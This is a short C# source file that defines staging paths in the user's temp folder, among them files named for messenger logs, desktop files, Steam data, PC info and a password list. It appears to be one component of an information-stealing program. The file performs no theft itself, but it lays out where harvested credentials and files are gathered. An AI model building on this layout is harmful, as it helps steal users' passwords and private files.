namespace DomaNet
{
    using System;
    using System.IO;

    public class GetDirPath
    {
        public static readonly string DefaultTemp = string.Concat(Environment.GetEnvironmentVariable("temp"), '\\');
        public static readonly string User_Name = string.Concat(DefaultTemp, Environment.UserName);
        public static readonly string DesktopDir = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

        public static readonly string LogMessanger = Path.Combine(User_Name, "Messengers.txt");
        public static readonly string Desktop_Folder = Path.Combine(User_Name, "DesktopFiles");
        public static readonly string Steam_Folder = Path.Combine(User_Name, "Steam");
        public static readonly string PC_File = Path.Combine(User_Name, "PcInfo.html");
        public static readonly string Pass_File = Path.Combine(User_Name, "List_Password.html");

        public GetDirPath() { }
    }
}